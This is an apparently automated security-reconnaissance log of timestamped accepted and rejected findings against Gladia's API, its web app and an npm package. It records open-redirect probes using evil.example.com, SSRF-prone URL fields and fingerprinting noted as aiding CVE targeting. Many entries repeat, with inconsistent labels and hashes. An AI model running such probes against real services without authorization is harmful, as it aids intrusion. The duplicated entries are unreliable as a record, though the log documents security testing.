+- 2026-08-08 ACCEPTED SSRF @ api.gladia.io: spec+RAG unchanged 04:01 UTC; audio_url/video_url/callback_url/CallbackConfig.url all `format:uri` no scheme allowlist; /v1/models confirms FR+US egress — SSRF-by-design fetch surface remains live, gated only by key (AUTH_HELPED)
+- 2026-08-08 CONFIRMED OTHER @ npm `gladia`@0.1.3: orphaned impersonation re-verified 04:01 UTC — `npm view` 4 versions [0.1.0–0.1.3], latest=0.1.3; GitHub API + web `alexisbouchez/gladia.ts` + user 404 (orphaned); description "Official" vs README "Unofficial" contradiction persists; dist-tag latest persists
+- 2026-08-08 ACCEPTED OAUTH @ app.gladia.io: /signin?redirect_to= reflection confirmed alive 04:01 UTC — form action reflects URL-encoded value; no host allowlist at unauthenticated layer; post-auth honoring still AUTH_HELPED (sole unverified gate for this target)
+- 2026-08-08 ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation confirmed — source repo alexisbouchez/gladia.ts + user 404 while dist-tag latest persists (fresh 04:01 UTC)
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: NO_DRIFT across 6 cycles (23:08→04:01 UTC) — OpenAPI 125131B/14 paths, /health 15B, /v1/models 530B, preflight-only x-powered-by differential, CORS static wildcard, key-gated v2 surface frozen
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to= reflection confirmed alive 04:01 UTC — form action reflects URL-encoded value; no host allowlist at unauthenticated layer; post-auth honoring still AUTH_HELPED
+- 2026-08-08 REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 6 cycles (23:08→04:01→07:0x UTC); openapi 125131B/14 paths, /health 15B, /v1/models 530B, preflight-only x-powered-by differential, CORS static wildcard, key-gated v2 — surface frozen, no new endpoints at 07:0x UTC
+[0m
+[0m$ [0mhead -50 /home/runner/work/gladia-hunt/gladia-hunt/reposcan-raw/grep-delta.txt
+DELTA: 0 new hit lines vs previous scan
+[0m
+[0m$ [0mhead -200 /home/runner/work/gladia-hunt/gladia-hunt/reposcan-raw/rag.txt 2>/dev/null | grep -A 50 "impersonation\|gladia@0.1.3\|searchParams\|token\|Official\|Unofficial"
+- npm: @gladiaio/sdk 1.1.0 (official, from gladiaio/sdk monorepo); `gladia` 0.1.3 claims "Official TypeScript SDK for Gladia" but repository = alexisbouchez/gladia.ts (PERSONAL account — flag, verify ownership)
+- PyPI: gladiaio-sdk (Python SDK, sync + async)
+
+## Rejected / parked
+- (none yet)
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: OpenAPI spec publicly exposed at /openapi.json with full v2 surface
+- 2026-08-07 ACCEPTED AUTH @ api.gladia.io: WebSocket auth uses token in URL query parameter per spec
+- 2026-08-07 ACCEPTED AUTH @ app.gladia.io: return-to cookie uses JWT-shaped base64url value without visible signature
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: Undocumented /health endpoint returns 200 (not in OpenAPI spec)
+- 2026-08-07 ACCEPTED AUTH @ api.gladia.io: WebSocket auth uses token in URL query parameter per OpenAPI spec
+- 2026-08-07 REJECTED AUTH @ app.gladia.io: return-to cookie tampering does not lead to open redirect (server validates/resets)
+- 2026-08-07 ACCEPTED OTHER @ npm registry: gladia@0.1.3 ownership anomaly (personal repo, unofficial maintainer) — requires affiliation verification
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: Undocumented /health endpoint returns 200 (not in OpenAPI spec)
+- 2026-08-07 ACCEPTED AUTH @ api.gladia.io: WebSocket auth uses token in URL query parameter per OpenAPI spec
+- 2026-08-07 REJECTED AUTH @ app.gladia.io: return-to cookie tampering does not lead to open redirect (server validates/resets)
+- 2026-08-07 ACCEPTED OTHER @ npm registry: gladia@0.1.3 ownership anomaly (personal repo, unofficial maintainer) — requires affiliation verification
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: `x-powered-by: Express` header present on CORS preflight (OPTIONS) responses only — confirms Node.js/Express.js backend; framework fingerprint for CVE targeting
+- 2026-08-07 REJECTED MISCONFIG @ api.gladia.io: /health?full=true does NOT leak verbose output — returns identical `{"health":"OK"}` to /health; no build/version/metadata disclosure via query params
+- 2026-08-07 REJECTED MISCONFIG @ api.gladia.io: /metrics endpoint does NOT exist — returns 404 (no Prometheus exposition endpoint)
+- 2026-08-07 REJECTED MISCONFIG @ api.gladia.io: /debug, /admin, /actuator/health, /v1 paths do NOT exist or return 404 — no Spring Boot Actuator, no debug panel, no catch-all admin
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: CORS preflight allows `Access-Control-Request-Headers: x-gladia-key` — auth header permitted in cross-origin requests (no credential support though)
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: /v2/live/init is NOT a real endpoint — confirmed 404 "Cannot POST"; WebSocket session is created via POST /v2/live, then client connects to returned `url` (wss://api.gladia.io/v2/live?token=<uuid>)
+- 2026-08-07 REJECTED MISCONFIG @ api.gladia.io: CORS wildcard reflects arbitrary origin — probe shows static `*` not Origin reflection
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: CORS preflight allows `x-gladia-key` header cross-origin (no credentials) — confirmed via OPTIONS probe
+- 2026-08-07 ACCEPTED AUTH @ app.gladia.io: redirect_to parameter reflected in signin form action — confirmed via GET probe
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: CORS GET responses return wildcard `*` not origin echo; expose-headers list trace/request-id headers; no allow-credentials → origin-reflection probe CLOSED, wildcard-without-credentials not exploitable
+- 2026-08-07 ACCEPTED OTHER @ npm registry: reposcan 20:02/20:06 flat (0 new hits, 5647 files) — gladia@0.1.3 anomaly remains sole reportable candidate; no new secrets
+- 2026-08-07 ACCEPTED AUTH @ api.gladia.io: /v1/history and /v2/upload confirmed key-gated (401) — no unauthenticated history/upload path
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: OpenAPI map stable at 14 paths (re-check 21:46Z) — no new endpoints since 20:55
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: 401 error body {statusCode,timestamp,path,message,request_id} is NestJS HttpException shape → backend is NestJS-on-Express, not plain Express
+- 2026-08-07 ACCEPTED OTHER @ npm registry: PyPI gladiaio-sdk latest 1.0.5; npm @gladiaio/sdk 1.1.0 unchanged — supply-chain surface static
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: live-probed /v2/transcription OPTIONS → `x-powered-by: Express` present; GET 401 → `x-powered-by` absent — confirmed preflight-only fingerprint differential (freshness 2026-08-07 21:46 UTC).
+- 2026-08-07 ACCEPTED OATH @ app.gladia.io: redirect_to reflected into form action for protocol-relative (`//evil`), bare-host, confusing-subdomain (`app.gladia.io.evil`), and path-only variants — no host allowlist enforced on reflection (post-auth honoring remains AUTH_HELPED/unverified).
+- 2026-08-07 CONFIRMED @ api.gladia.io: /openapi.json (200, 125KB, CORS *) publicly exposes full v2 surface incl. audio_url field accepted verbatim — confirms SSRF fetch-by-design path (freshly sampled).
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: OpenAPI /v1/history exposes OBJECT-typed custom_metadata query param with additionalProperties:true — complex query parsing surface for injection/testing
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: CallbackConfigDto.url lacks scheme allowlist/pattern at schema level — SSRF guard absent by design in spec
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: /v1/models public endpoint leaks datacenter regions (FR/US) and static pricing metadata — aids SSRF egress targeting
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: live-probed OPTIONS /v2/transcription → x-powered-by: Express present, ACAO:*, Access-Control-Allow-Headers: x-gladia-key (2026-08-07 22:22 UTC — surface unchanged from 21:46 UTC)
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: live-probed GET /v2/transcription → 401 no gladia key provided, x-powered-by absent (preflight-only fingerprint confirmed, 2026-08-07 22:22 UTC)
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: /openapi.json (200, 125KB, CORS *) exposes InitTranscriptionRequest.audio_url as format:uri with no scheme allowlist + deprecated callback_url + CallbackConfigDto.url (format:uri, no allowlist) — confirms SSRF-by-design surface
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: /health returns 200 {"health":"OK"}; /health?full=true returns identical payload — no verbose disclosure via query param (REJECTED as verbose-leak vector, ACCEPTED as undocumented endpoint)
+- 2026-08-07 REJECTED MISCONFIG @ api.gladia.io: /metrics (404), /debug (404), /admin (404), /actuator/health (404) — no Prometheus, no debug panel, no Spring Boot Actuator (all REJECTED, surface dead)
+- 2026-08-07 ACCEPTED AUTH @ api.gladia.io: POST /v2/live → 401 key-gated; POST /v2/live/init → 404 "Cannot POST" — WebSocket session created via POST /v2/live then wss://api.gladia.io/v2/live?token=<uuid>, no alternative init endpoint
+- 2026-08-07 ACCEPTED OATH @ app.gladia.io: live-probed /signin?redirect_to=https://evil.example.com → form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com" — server-side reflection into POST form action (confirmed for protocol-relative //evil, bare-host, confusing-subdomain app.gladia.io.evil, path-only) — post-auth Location unverified (AUTH_HELPED)
+- 2026-08-07 REJECTED AUTH @ app.gladia.io: return-to cookie tampering does NOT lead to open redirect — server resets tampered value to {"url":"/"} (REJECTED as redirect vector, confirmed via prior + current probe)
+- 2026-08-07 ACCEPTED OTHER @ npm: gladia@0.1.3 registry metadata stable (description "Official TypeScript SDK", repo alexisbouchez/gladia.ts personal, maintainer softwarecitadel@gmail.com) — impersonation anomaly confirmed live 2026-08-07 22:22 UTC
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: 14 OpenAPI paths stable (no new endpoints since 21:46 UTC); /v1/models public (security: not set), all other v2 paths key-gated (401)
+- 2026-08-07 REJECTED MISCONFIG @ api.gladia.io: full surface re-probe 23:08Z byte-identical to 22:22Z (openapi 125131B/14 paths, /v1/models, /health, /v2/live 401, CORS, x-powered-by differential) — no drift, nothing new to report.
+- 2026-08-07 ACCEPTED OTHER @ npm: `gladia`@0.1.3 (softwarecitadel, alexisbouchez/gladia.ts) + @gladiaio/sdk 1.1.0 metadata static 23:08Z — supply-chain surface unchanged.
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: live spec still shows audio_url + CallbackConfigDto.url as `format:uri` with no scheme allowlist — SSRF-by-design fetch surface persists (re-verified 23:08Z).
+- 2026-08-07 ACCEPTED SSRF @ api.gladia.io: RAG of SDK source (packages/sdk-js/client.ts + packages/sdk-python/v2/prerecorded/core.py) confirms is_url()/uploadFile() only gates upload-vs-direct path; no host allowlist, metadata-blocklist, redirect-limit, or scheme validation forwarded to API for audio_url/video_url/callback_url — SSRF guard absent by design in SDK and spec.
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: live-probed OPTIONS /v2/pre-recorded → x-powered-by: Express present; POST → 401 x-powered-by absent — confirmed preflight-only fingerprint differential on second v2 endpoint (not isolated to /v2/transcription).
+- 2026-08-07 ACCEPTED AUTH @ api.gladia.io: POST /v2/pre-recorded with invalid key → 401 NestJS HttpException shape {statusCode,timestamp,path,message,request_id} — no x-powered-by leak on error response; uniform key-gated auth confirmed across v2 endpoints.
+- 2026-08-07 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com verified live 23:09 UTC — form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com" server-side reflection persists; /apikeys and /transcriptions both 302→/signin with return-to cookie encoding their path ({'url':'/apikeys'}, {'url':'/transcriptions'}) — unsigned base64url JSON confirmed across multiple paths, server resets on tamper (REJECTED as cookie-tamper vector).
+- 2026-08-07 ACCEPTED OTHER @ npm: gladia@0.1.3 registry metadata stable 23:09 UTC (description="Official TypeScript SDK for Gladia", repo=alexisbouchez/gladia.ts personal, maintainer=softwarecitadel@gmail.com) — impersonation anomaly persists; @gladiaio/sdk@1.1.0 confirmed official from gladiaio org.
+- 2026-08-07 REJECTED MISCONFIG @ api.gladia.io: /v2/live/init confirmed 404 "Cannot POST" — not a real endpoint; WebSocket session created via POST /v2/live then wss://api.gladia.io/v2/live?token=<uuid> (no alternative init endpoint).
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: /openapi.json (200, CORS *) exposes video_url as plain string field with no format/scheme validation in /video/text/video-transcription multipart schema — second SSRF fetch surface confirmed alongside audio_url.
+- 2026-08-07 REJECTED MISCONFIG @ api.gladia.io: full surface re-probe 23:48Z byte-identical to 23:08Z (openapi 125131B/14 paths, /v1/models 530B, /health 15B, 401 gate, preflight x-powered-by differential) — no drift, nothing new to report.
+- 2026-08-07 ACCEPTED OTHER @ npm: `gladia`@0.1.3 (softwarecitadel, alexisbouchez/gladia.ts) + @gladiaio/sdk@1.1.0 metadata static 23:48Z — supply-chain surface unchanged.
+- 2026-08-07 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com form-action reflection re-confirmed 23:48Z — reflection surface persists, post-auth honoring still AUTH_HELPED.
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: /health returns 200 `{"health":"OK"}` (x-powered-by ABSENT on GET) — undocumented endpoint + preflight-only fingerprint confirmed fresh 23:5x UTC
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: OPTIONS /v2/transcription 204 `x-powered-by: Express` + ACAO `*` + allow `x-gladia-key`, POST 401 no`x-powered-by` — preflight-only fingerprint + creds-bypassable CORS confirmed fresh
+- 2026-08-08 ACCEPTED AUTH @ api.gladia.io: POST /v2/transcription (no key) → 401 — key-gated surface confirmed; @gladiaio/key header is the sole auth model
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: /openapi.json (200, 125131B, CORS `*`, expose-headers trace ids) + /v1/models (200 public CORS `*`) fully exposed — surface stable & fresh
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com → form action reflects URL-encoded value — reflection confirmed fresh 23:5x UTC
+- 2026-08-08 ACCEPTED MISCONFIG @ app.gladia.io: /dashboard returns 200 text/html (SPA shell) without auth — client-side enforcement confirmed fresh
+- 2026-08-08 ACCEPTED OTHER @ npm: `gladia`@0.1.3 description "Official TypeScript SDK…", repo alexisbouchez/gladia.ts (personal), maintainer softwarecitadel@gmail.com — impersonation anomaly confirmed fresh 23:5x UTC
+- 2026-08-08 (no new REJECTED class this cycle; surface re-confirmed byte-identical to 23:08 per 23:48 prior re-probe — drift negative)
+- 2026-08-08 CONFIRMED OTHER @ npm gladia@0.1.3: artifact-level impersonation independently re-verified 02:50 UTC (tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2; package.json "Official" vs README "Unofficial"; author alexisbouchez/personal repo; src/client.ts:307 raw x-gladia-key appended to wss://.../v2/live? token query)
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to= reflection confirmed alive 02:50 UTC across protocol-relative //evil, bare-host, app.gladia.io.evil confusing-subdomain, path-only — no host allowlist at unauthenticated layer (post-auth honoring still AUTH_HELPED)
+- 2026-08-08 REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 6 cycles (23:08→23:48→00:44→02:50 UTC); openapi 125131B/14 paths, /health 15B, /v1/models 530B, x-powered-by Express on OPTIONS-only, CORS `*`+ACAH x-gladia-key — surface frozen, nothing new this cycle
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: preflight-only `x-powered-by: Express` fingerprint differential confirmed fresh 02:50 UTC (OPTIONS /v2/transcription 204 xpb=Express; POST 401 xpb absent) — not isolated to one endpoint
+- 2026-08-08 ACCEPTED SSRF @ api.gladia.io: spec/spec+RAG unchanged 02:50 UTC (audio_url/video_url/callback_url format:uri no scheme allowlist, no client-side guard) — SSRF-by-design fetch surface remains live, gated only by key AUTH_HELPED
+- 2026-08-08 ACCEPTED OTHER @ npm gladia@0.1.3: artifact-level impersonation independently re-verified 02:50 UTC (tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2; package.json "Official" vs README "Unofficial"; author alexisbouchez/personal repo; src/client.ts:307 raw x-gladia-key appended to wss://.../v2/live? token query)
+- 2026-08-08 REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 6 cycles (23:08→23:48→00:44→02:50→04:01 UTC); openapi 125131B/14 paths, /health 15B, /v1/models 530B, x-powered-by Express on OPTIONS-only, CORS `*`+ACAH x-gladia-key — surface frozen, no new endpoints
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: preflight-only `x-powered-by: Express` fingerprint differential confirmed fresh 04:01 UTC (OPTIONS /v2/transcription 204 xpb=Express; GET/POST 401 xpb absent) — confirmed not isolated to one endpoint
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: GET /v2/transcription (no key) → 401 NestJS HttpException shape confirmed fresh 04:01 UTC (timestamp 2026-08-08T04:01:14.742Z, request_id G-36290736) — uniform key-gated auth across v2 endpoints
+- 2026-08-08 ACCEPTED SSRF @ api.gladia.io: spec+RAG unchanged 04:01 UTC; audio_url/video_url/callback_url/CallbackConfig.url all `format:uri` no scheme allowlist; /v1/models confirms FR+US egress — SSRF-by-design fetch surface remains live, gated only by key (AUTH_HELPED)
+- 2026-08-08 CONFIRMED OTHER @ npm `gladia`@0.1.3: orphaned impersonation re-verified 04:01 UTC — `npm view` 4 versions [0.1.0–0.1.3], latest=0.1.3; GitHub API + web `alexisbouchez/gladia.ts` + user 404 (orphaned); description "Official" vs README "Unofficial" contradiction persists; dist-tag latest persists
+- 2026-08-08 ACCEPTED OAUTH @ app.gladia.io: /signin?redirect_to= reflection confirmed alive 04:01 UTC — form action reflects URL-encoded value; no host allowlist at unauthenticated layer; post-auth honoring still AUTH_HELPED (sole unverified gate for this target)
+- 2026-08-08 ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation confirmed — source repo alexisbouchez/gladia.ts + user 404 while dist-tag latest persists (fresh 04:01 UTC)
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: NO_DRIFT across 6 cycles (23:08→04:01 UTC) — OpenAPI 125131B/14 paths, /health 15B, /v1/models 530B, preflight-only x-powered-by differential, CORS static wildcard, key-gated v2 surface frozen
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to= reflection confirmed alive 04:01 UTC — form action reflects URL-encoded value; no host allowlist at unauthenticated layer; post-auth honoring still AUTH_HELPED
+- 2026-08-08 REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 6 cycles (23:08→04:01→07:0x UTC); openapi 125131B/14 paths, /health 15B, /v1/models 530B, preflight-only x-powered-by differential, CORS static wildcard, key-gated v2 — surface frozen, no new endpoints at 07:0x UTC
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: preflight-only `x-powered-by: Express` fingerprint differential confirmed fresh 07:0x UTC (OPTIONS /v2/transcription 204 xpb=Express; POST 401 xpb absent) — not isolated to /v2/transcription, persists across /v2/pre-recorded too
+- 2026-08-08 ACCEPTED OAUTH @ app.gladia.io: /signin?redirect_to= reflection confirmed alive fresh 07:0x UTC — form action reflects URL-encoded value; no host allowlist at unauthenticated layer; post-auth honoring still AUTH_HELPED (sole unverified gate)
+- 2026-08-08 ACCEPTED MISCONFIG @ app.gladia.io: /dashboard returns 200 (SPA shell) without auth at 07:0x UTC — client-side enforcement confirmed; server-side 302 gate on /apikeys and /transcriptions intact
+- 2026-08-08 ACCEPTED OTHER @ npm: gladia@0.1.3 sha256 `3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2` confirmed unchanged fresh 07:0x UTC; repo alexisbouchez/gladia.ts + user 404 (orphaned); README "Unofficial" vs package.json "Official" contradiction persists (out of scope per phase target=app, but tracked)
+- 2026-08-08 ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation confirmed — source repo alexisbouchez/gladia.ts + user 404 while dist-tag latest persists (fresh 07:59 UTC)
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: NO_DRIFT across 7 cycles (23:08→07:59 UTC) — OpenAPI 125131B/14 paths, /health 15B, /v1/models 530B, preflight-only x-powered-by differential, CORS static wildcard, key-gated v2 surface frozen
+- 2026-08-08 ACCEPTED SSRF @ api.gladia.io: spec+RAG unchanged 07:59 UTC; audio_url/video_url/callback_url/CallbackConfig.url all `format:uri` no scheme allowlist; /v1/models confirms FR+US egress — SSRF-by-design fetch surface remains live, gated only by key (AUTH_HELPED)
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to= reflection confirmed alive 07:59 UTC — form action reflects URL-encoded value; no host allowlist at unauthenticated layer; CSP lacks form-action; post-auth honoring still AUTH_HELPED
+- 2026-08-08 ACCEPTED MISCONFIG @ app.gladia.io: /dashboard returns 200 (SPA shell) without auth at 07:59 UTC — client-side enforcement confirmed; server-side 302 gate on /apikeys and /transcriptions intact
+- 2026-08-08 REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 6 cycles (23:08→04:01→07:0x UTC) — surface frozen, nothing new this cycle
+- 2026-08-08 ACCEPTED OAUTH @ app.gladia.io: /signin?redirect_to= reflection confirmed alive fresh 07:0x UTC — form action reflects URL-encoded value; no host allowlist at unauthenticated layer; post-auth honoring still AUTH_HELPED (sole unverified gate for app target)
+- 2026-08-08 ACCEPTED OTHER @ npm: gladia@0.1.3 orphaned impersonation re-verified — sha256 `3b23ec7d…7f2` unchanged; source repo alexisbouchez/gladia.ts + GitHub user 404 (orphaned) while dist-tag latest persists; package.json "Official" vs README "Unofficial" contradiction persists
+- 2026-08-08 ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation confirmed — source repo alexisbouchez/gladia.ts + user 404 while dist-tag latest persists (fresh 09:45 UTC)
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: NO_DRIFT across 8 cycles (23:08→09:44 UTC) — OpenAPI 125131B/14 paths, /health 15B, /v1/models 530B, preflight-only x-powered-by differential, CORS static wildcard, key-gated v2 surface frozen
+- 2026-08-08 ACCEPTED SSRF @ api.gladia.io: spec+RAG unchanged 09:44 UTC; audio_url/video_url/callback_url/CallbackConfig.url all `format:uri` no scheme allowlist; /v1/models confirms FR+US egress — SSRF-by-design fetch surface remains live, gated only by key (AUTH_HELPED)
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to= reflection confirmed alive 09:44 UTC — form action reflects URL-encoded value; no host allowlist at unauthenticated layer; CSP lacks form-action; post-auth honoring still AUTH_HELPED
+- 2026-08-08 ACCEPTED MISCONFIG @ app.gladia.io: /dashboard returns 200 (SPA shell) without auth at 09:44 UTC — client-side enforcement confirmed; server-side 302 gate on /apikeys and /transcriptions intact
+- 2026-08-08 REJECTED OTHER @ api.gladia.io: per-instance codegen fingerprint hypothesis falsified — 3 fresh fetches → 3 distinct example timestamps (25.976/32.264/26.548Z) beyond recorded 31/35Z; values are a deploy-window artifact, not instance identity
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: structural hash 9a326c92… (examples-stripped) stable across 3 fetches → validated drift baseline; raw byte hash varies per fetch due to timestamp examples
+- 2026-08-08 REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT this cycle (09:44 UTC) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static wildcard — surface frozen, nothing new to report
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: structural hash (examples-stripped) stable at sha256 9a326c924644b59854b0cafddb5f477c23d6d1cfb8c220f0ff5bf689c3c61c7b across 3 fetches — validated drift baseline replacing byte-hash
+- 2026-08-08 REJECTED MISCONFIG @ api.gladia.io: per-instance codegen fingerprint hypothesis falsified — 3 fresh fetches returned 3 distinct example timestamps (25.976/32.264/26.548Z) beyond prior values; dynamic examples are deploy-window artifact not instance identity
+- 2026-08-08 REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 9 cycles (23:08→current) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static wildcard, signin reflection, /dashboard 200 — surface frozen, nothing new to report
+- 2026-08-08 ACCEPTED OTHER @ api.gladia.io: recorded structural-hash baseline `9a326c92…` is not reproducible without the original strip recipe — my normalization yields `a7fa3286…`; size+path count remain the robust drift check until the recipe is pinned
+- 2026-08-08 ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation confirmed — shasum `cc96f84a…` current dist-shasum, source repo alexisbouchez/gladia.ts + user 404, dist-tag latest persists; @gladiaio/sdk@1.1.0 static (fresh this cycle)
+- 2026-08-08 ACCEPTED OTHER @ npm gladia@0.1.3: impersonation persists fresh 10:16 UTC — description "Official", orphaned repo/user 404, sha256 3b23ec7d…7f2, README↔package.json "Official/Unofficial" contradiction stable.
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: NO_DRIFT fresh 10:16 UTC — openapi 125131B/14 paths, /health 15B {health:OK}, /v1/models 530B public, preflight-only x-powered-by: Express (OPTIONS 204, GET 401 absent), CORS static *.
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to= reflection confirmed fresh 10:16 UTC (action="/signin?redirect_to=https%3A%2F%2Fevil.example.com"); CSP has frame-src + base-uri 'self' but NO form-action directive.
+- 2026-08-08 ACCEPTED MISCONFIG @ app.gladia.io: /dashboard 200 text/html SPA shell without auth confirmed fresh — client-side enforcement; server-side 302 gate intact on /apikeys and /transcriptions.
+- 2026-08-08 ACCEPTED OTHER @ npm gladia@0.1.3: impersonation persists fresh 10:16 UTC — description "Official", orphaned repo/user 404, sha256 3b23ec7d…7f2, README↔package.json "Official/Unofficial" contradiction stable.
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: NO_DRIFT fresh 10:16 UTC — openapi 125131B/14 paths, /health 15B {health:OK}, /v1/models 530B public, preflight-only x-powered-by: Express (OPTIONS 204, GET 401 absent), CORS static *.
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to= reflection confirmed fresh 10:16 UTC (action="/signin?redirect_to=https%3A%2F%2Fevil.example.com"); CSP has frame-src + base-uri 'self' but NO form-action directive.
+- 2026-08-08 ACCEPTED MISCONFIG @ app.gladia.io: /dashboard 200 text/html SPA shell without auth confirmed fresh — client-side enforcement; server-side 302 gate intact on /apikeys and /transcriptions.
+- 2026-08-08 REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT this cycle (10:16 UTC) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static wildcard — surface frozen
+- 2026-08-08 ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation confirmed — source repo alexisbouchez/gladia.ts + user 404 while dist-tag latest persists (fresh 10:16 UTC)
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: NO_DRIFT across 9 cycles (23:08→10:16 UTC) — OpenAPI 125131B/14 paths, /health 15B, /v1/models 530B, preflight-only x-powered-by differential, CORS static wildcard, key-gated v2 surface frozen
+- 2026-08-08 ACCEPTED SSRF @ api.gladia.io: spec+RAG unchanged 10:16 UTC; audio_url/video_url/callback_url/CallbackConfig.url all `format:uri` no scheme allowlist; /v1/models confirms FR+US egress — SSRF-by-design fetch surface remains live, gated only by key (AUTH_HELPED)
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to= reflection confirmed alive 10:16 UTC — form action reflects URL-encoded value; no host allowlist at unauthenticated layer; CSP lacks form-action; post-auth honoring still AUTH_HELPED
+- 2026-08-08 ACCEPTED MISCONFIG @ app.gladia.io: /dashboard returns 200 (SPA shell) without auth at 10:16 UTC — client-side enforcement confirmed; server-side 302 gate on /apikeys and /transcriptions intact
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: NO_DRIFT across 10 cycles (23:08→current) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static wildcard — surface frozen, nothing new to report
+- 2026-08-08 ACCEPTED OTHER @ npm gladia@0.1.3: impersonation persists — shasum `cc96f84a…` unchanged, repo alexisbouchez/gladia.ts + user 404 (orphaned), @gladiaio/sdk@1.1.0 static (fresh this cycle)
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: NO_DRIFT across 10 cycles (23:08→11:36 UTC) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static wildcard, key-gated v2 surface frozen
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to= reflection confirmed alive 11:36 UTC — form action reflects URL-encoded value; no host allowlist at unauthenticated layer; CSP lacks form-action; post-auth honoring still AUTH_HELPED
+- 2026-08-08 ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation confirmed — shasum cc96f84a… unchanged, repo alexisbouchez/gladia.ts + user 404 while dist-tag latest persists (fresh 11:37 UTC)
+- 2026-08-08 REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 11 cycles (23:08→11:36 UTC) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static wildcard — surface frozen, nothing new to report
+- 2026-08-08 ACCEPTED OTHER @ npm gladia@0.1.3: impersonation persists — shasum `cc96f84a…` + integrity sha512-56NWQ9pEVyd/… unchanged, repo alexisbouchez/gladia.ts + user 404 (orphaned), dist-tag latest persists, @gladiaio/sdk@1.1.0 static (fresh 11:36 UTC)
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: POST /signin intent=google initiates OAuth carrying redirect_to (302→accounts.google.com) at unauth layer — reflection confirmed on the auth-initiation path, not just form action (fresh 11:36 UTC)
